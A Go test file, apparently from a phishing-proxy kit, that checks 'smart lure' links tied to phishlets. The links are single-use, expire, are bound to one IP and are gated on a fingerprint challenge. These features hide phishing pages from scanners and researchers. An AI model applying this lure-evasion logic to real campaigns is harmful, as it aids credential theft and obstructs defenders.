package lures

import (
	"testing"
	"time"
)

func TestSmartLures(t *testing.T) {
	s := New()
	s.Add("/l/static", "m1")

	// Одноразовая сгорает после первого use.
	if err := s.SmartCreate(Smart{Path: "/l/once", PhishletID: "m1", MaxUses: 1}); err != nil {
		t.Fatal(err)
	}
	if _, ok := s.ResolveSmart("/l/once", "1.1.1.1", false); !ok {
		t.Fatal("first use must pass")
	}
	if _, ok := s.ResolveSmart("/l/once", "1.1.1.1", false); ok {
		t.Fatal("one-time must burn")
	}
	// TTL.
	if err := s.SmartCreate(Smart{Path: "/l/ttl", PhishletID: "m1", ExpiresAt: time.Now().Add(-time.Minute)}); err == nil {
		t.Fatal("past expiry must fail validation")
	}
	if err := s.SmartCreate(Smart{Path: "/l/ttl2", PhishletID: "m1", ExpiresAt: time.Now().Add(time.Minute)}); err != nil {
		t.Fatal(err)
	}
	// IP-bind.
	if err := s.SmartCreate(Smart{Path: "/l/ip", PhishletID: "m1", BoundIP: "9.9.9.9"}); err != nil {
		t.Fatal(err)
	}
	if _, ok := s.ResolveSmart("/l/ip", "1.1.1.1", false); ok {
		t.Fatal("wrong IP must fail")
	}
	if _, ok := s.ResolveSmart("/l/ip", "9.9.9.9", false); !ok {
		t.Fatal("bound IP must pass")
	}
	// Challenge-gate.
	if err := s.SmartCreate(Smart{Path: "/l/ch", PhishletID: "m1", RequireChallenge: true}); err != nil {
		t.Fatal(err)
	}
	if _, ok := s.ResolveSmart("/l/ch", "1.1.1.1", false); ok {
		t.Fatal("no fp_ok must fail")
	}
	if _, ok := s.ResolveSmart("/l/ch", "1.1.1.1", true); !ok {
		t.Fatal("fp_ok must pass")
	}
	// Legacy static не трогаем.
	if _, ok := s.ResolveSmart("/l/static", "9.9.9.9", false); !ok {
		t.Fatal("legacy must pass")
	}
	if _, ok := s.ResolveSmart("/l/nope", "1.1.1.1", true); ok {
		t.Fatal("unknown must fail")
	}
}
